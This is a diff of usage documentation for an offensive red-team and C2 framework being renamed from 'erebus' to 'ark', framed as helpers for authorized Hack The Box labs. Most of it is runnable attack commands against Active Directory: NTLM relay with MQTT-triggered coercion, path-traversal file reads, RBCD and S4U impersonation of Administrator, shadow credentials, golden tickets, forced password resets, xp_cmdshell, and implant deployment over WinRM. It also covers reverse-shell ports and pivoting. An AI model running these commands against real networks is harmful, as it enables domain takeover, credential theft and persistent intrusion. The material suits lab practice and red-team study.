@@ -2,18 +2,23 @@
 
 Authorized **HTB / owned lab** helpers that run **without** a C2 session or teamserver.
 
-**Inbound C2 / firewall / auth logs / reverse tunnel:** `erebus inbound` · `docs/OPERATOR_INBOUND.md`.
+**Inbound C2 / firewall / auth logs / reverse tunnel:** `ark inbound` · `docs/OPERATOR_INBOUND.md`.
 
 | Command | Purpose |
 | --- | --- |
-| `erebus inbound …` | tun0 / listeners / SOCKS env / SSH reverse tunnel |
-| `erebus ldap …` | Host-side LDAPS bind / enum / dangling ADCS template names |
-| `erebus smb …` | Host-side SMB shares / ls / get (NTLM; `--ticket` is Impacket `smbclient.py -k` until native Kerberos SMB) |
-| `erebus kerberos s4u …` | S4U2Self+S4U2Proxy AES; `--altservice` rewrites ticket sname (getST-style) |
-| `erebus ad password …` | ForceChangePassword via LDAPS `unicodePwd` |
-| `erebus ad add-computer …` | LDAP Add, then Impacket `addcomputer.py -method SAMR` on `WILL_NOT_PERFORM` |
-| `erebus mqtt …` | MQTT subscribe / publish / healthcheck URL hijack |
-| `erebus relay http …` | HTTP NTLM capture → relay to target → held session GET (LFI) |
+| `ark inbound …` | tun0 / listeners / SOCKS env / SSH reverse tunnel / TCP redirector |
+| `ark ldap …` | Host-side LDAPS bind / enum / dangling ADCS template names |
+| `ark smb …` | Host-side SMB shares / ls / get (NTLM or `--ticket` native Kerberos; Impacket wrap: `ARK_SMB_IMPACKET=1`) |
+| `ark adcs …` | Dangling ESC1 template create / grant / WCCE req / auto (no Certipy). PKINIT UnPAC is **not** native yet |
+| `ark rbcd …` | Host-side RBCD write / clear / show |
+| `ark kerberos …` | Skew, AES asktgt, S4U, keylist, golden/silver, ticket import. `pkinit` loads PFX then errors (PA-PK-AS-REQ not assembled) |
+| `ark ad password …` | ForceChangePassword via LDAPS `unicodePwd` |
+| `ark ad add-computer …` | LDAP Add, then Impacket `addcomputer.py -method SAMR` on `WILL_NOT_PERFORM` |
+| `ark ad shadow auto …` | KeyCredentialLink write + PFX |
+| `ark winrm …` | Host-side PSRP (pypsrp; needs repo `scripts/` or `ARK_ROOT`) |
+| `ark mssql …` | Host-side MSSQL query / xp_cmdshell (impacket; SOCKS) |
+| `ark mqtt …` | MQTT subscribe / publish / healthcheck URL hijack |
+| `ark relay http …` | HTTP NTLM capture → relay to target → held session GET (LFI) |
 
 Also available as operator REPL commands `ldap` / `host-smb` / `ad` / `mqtt` / `relay` (same code path). Implant `smb` / `ldap-enum` still need `use <session>`.
 
@@ -23,10 +28,10 @@ Default: **refuse listen ports &lt; 1024**.
 
 ```bash
 # Good
-erebus relay http start --listen 10.10.14.15:8888 --target http://app.lab.htb/
+ark relay http start --listen 10.10.14.15:8888 --target http://app.lab.htb/
 
 # Override (needs CAP_NET_BIND_SERVICE / root)
-EREBUS_ALLOW_PRIV_PORTS=1 erebus relay http start --listen 0.0.0.0:80 --target http://app.lab.htb/ --allow-priv-ports
+ARK_ALLOW_PRIV_PORTS=1 ark relay http start --listen 0.0.0.0:80 --target http://app.lab.htb/ --allow-priv-ports
 ```
 
 Many HTB coerces (WebDAV `@port`, PowerShell) work on **high HTTP ports**. Classic SMB coerce still wants **445** — use sudo or pivot.
@@ -46,19 +51,19 @@ firewall-cmd --add-port=4444/tcp   # reverse shells
 
 ```bash
 # Terminal A — NTLM relay (sticky TCP + held session for LFI)
-erebus relay http start \
+ark relay http start \
   --listen 10.10.14.15:8888 \
   --target http://gpz-op26-secure.ghostlink.htb/ \
   --kernel-auth
 
 # Terminal B — coerce via MQTT healthcheck
-erebus mqtt healthcheck-hijack --host 10.129.x.x \
+ark mqtt healthcheck-hijack --host 10.129.x.x \
   --topic GhostProtocolZero/systems/node/secureshare/healthcheck \
   --url http://10.10.14.15:8888
 
 # After SUCCEED log line:
-erebus relay http sessions
-erebus relay http get --session 1 --double-encode \
+ark relay http sessions
+ark relay http get --session 1 --double-encode \
   --path '..\..\..\..\..\..\..\windows\win.ini' \
   --out loot/win.ini
 ```
@@ -66,7 +71,7 @@ erebus relay http get --session 1 --double-encode \
 **Relay hardening (post code-review):**
 - Sticky single TCP connection for Type1→Type3→subsequent GETs (connection-oriented NTLM)
 - Control API defaults to **127.0.0.1 only**; refuse `0.0.0.0` unless `--api-allow-remote`
-- Stale `~/.erebus/relay/control.json` cleared on stop / dead PID
+- Stale `~/.ark/relay/control.json` cleared on stop / dead PID
 - Authorization never forwarded on redirects
 - Double-encode matches Python `quote(quote(path, safe=""), safe="")` (dots + backslashes)
 
@@ -75,36 +80,47 @@ erebus relay http get --session 1 --double-encode \
 **Clock skew:** Ghostlink DC was ~8h ahead; DanglingTree +7h.
 
 ```bash
-erebus kerberos skew --dc 10.129.x.x
-erebus kerberos with-skew --dc 10.129.x.x -- certipy auth -pfx administrator.pfx -dc-ip 10.129.x.x
+ark kerberos skew --dc 10.129.x.x
+ark kerberos with-skew --dc 10.129.x.x -- certipy auth -pfx administrator.pfx -dc-ip 10.129.x.x
 ```
 
-`with-skew` needs libfaketime (`EREBUS_FAKETIME_SO` or `/usr/lib64/libfaketime.so.1`).
+`with-skew` needs libfaketime (`ARK_FAKETIME_SO` or `/usr/lib64/libfaketime.so.1`).
 
 ## Host-side AD (no implant)
 
 DanglingTree-class boxes often have creds long before WinRM/RDP. Prefer files for secrets (`--pass-file`).
 
 ```bash
-erebus ldap bind --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass
-erebus ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type interesting
-erebus ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type acl
-erebus ldap dangling --dc 10.129.x.x --domain danglingtree.htb --user jake.h --pass-file ./jake.pass
-erebus ldap set --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob scriptPath loot.bat --yes
-erebus ad add-computer --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name ATTACK --out ./mach.pass --yes
-erebus rbcd write --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$ --from ATTACK$ --yes
-erebus rbcd show  --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$
-erebus kerberos s4u --dc 10.129.x.x --domain danglingtree.htb --user ATTACK$ --pass-file ./mach.pass \
+ark ldap bind --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass
+ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type interesting
+ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type acl
+ark ldap dangling --dc 10.129.x.x --domain danglingtree.htb --user jake.h --pass-file ./jake.pass
+ark ldap set --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob scriptPath loot.bat --yes
+ark ad add-computer --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name ATTACK --out ./mach.pass --yes
+ark rbcd write --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$ --from ATTACK$ --yes
+ark rbcd show  --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$
+ark kerberos s4u --dc 10.129.x.x --domain danglingtree.htb --user ATTACK$ --pass-file ./mach.pass \
   --impersonate Administrator --spn cifs/dc.danglingtree.htb
-erebus kerberos asktgt --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p
-erebus kerberos ticket import ./admin.ccache
-erebus ldap bind --dc 10.129.x.x --domain danglingtree.htb --ticket <id>
+ark ad shadow auto --dc 10.129.x.x --domain danglingtree.htb --user U --hash NT --target SAM --out t.pfx --yes
+ark ad dmsa create --dc DC --domain D --user U --hash NT --name pwn --ou "OU=X,DC=d,DC=htb" --target victim --yes
+ark winrm --host H --user U --domain D --hash-file nt.txt --ps "whoami"
+# winrm/mssql wrap scripts/ from a checkout. Installed ~/.local/bin/ark needs:
+#   export ARK_ROOT=/path/to/ARK
+eval "$(ark inbound env --port 1080)"
+ark mssql query --host 172.16.0.11 --user U --pass-file P --windows --sql "SELECT SYSTEM_USER"
+# SOCKS is applied (PySocks). --host is the inner SQL IP. Password stays in --pass-file (not argv).
+ark kerberos asktgt --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p
+ark kerberos ticket import ./admin.ccache
+ark ldap bind --dc 10.129.x.x --domain danglingtree.htb --ticket <id>
+ark smb ls --host 10.129.x.x --share C$ --ticket <id>
+ark kerberos keylist --dc 10.129.x.x --domain danglingtree.htb \
+  --user Administrator --rodc-no N --aes-file ./rodc.aes
 
-erebus smb shares --host 10.129.x.x --anon
-erebus smb get --host 10.129.x.x --share IT --path DanglingTree_RoE_Assessment.pdf --out roe.pdf
+ark smb shares --host 10.129.x.x --anon
+ark smb get --host 10.129.x.x --share IT --path DanglingTree_RoE_Assessment.pdf --out roe.pdf
 
 # ForceChangePassword (do not put the sAM prefix in the new password)
-erebus ad password --dc 10.129.x.x --domain danglingtree.htb \
+ark ad password --dc 10.129.x.x --domain danglingtree.htb \
   --user alex.o --pass-file ./alex.pass --target jake.h --new-pass-file ./jake.new --yes
 ```
 
@@ -115,7 +131,7 @@ LDAPS is tried first so DCs that return `strongerAuthRequired` on unsigned 389 s
 Once you have `nvirelli` / Admin (or similar):
 
 ```bash
-erebus op lateral winrm <IP> "whoami" --user U --domain D --pass-file ./pass.txt
+ark op lateral winrm <IP> "whoami" --user U --domain D --pass-file ./pass.txt
 # or --hash <NT>
 python3 scripts/deploy_winrm.py --host <IP> --user U --domain D --pass-file ./pass.txt --implant build/implant.exe
 ```
@@ -127,7 +143,7 @@ Prefer soft compromise; skip LSASS unless the objective requires it.
 After a Linux foothold (e.g. Gogs RCE / web RCE):
 
 1. **Prefer C Linux implant** (`make implant-c-linux` + CA pin).
-2. If the host cannot reach operator VPN: `erebus inbound drop user@TARGET` (tunnel + generate; do not bare-make).
+2. If the host cannot reach operator VPN: `ark inbound drop user@TARGET` (tunnel + generate; do not bare-make).
 3. Exercise shell / file / process from the C session (product QA).
 4. **Pivot:** C reverse SOCKS (`socks start`) is implemented — lab-prove on session (M4c live). Fallback: reverse tunnel / Ligolo / Go with justification.
 5. External chisel is fine for speed; document intended path as **C implant** for framework QA.
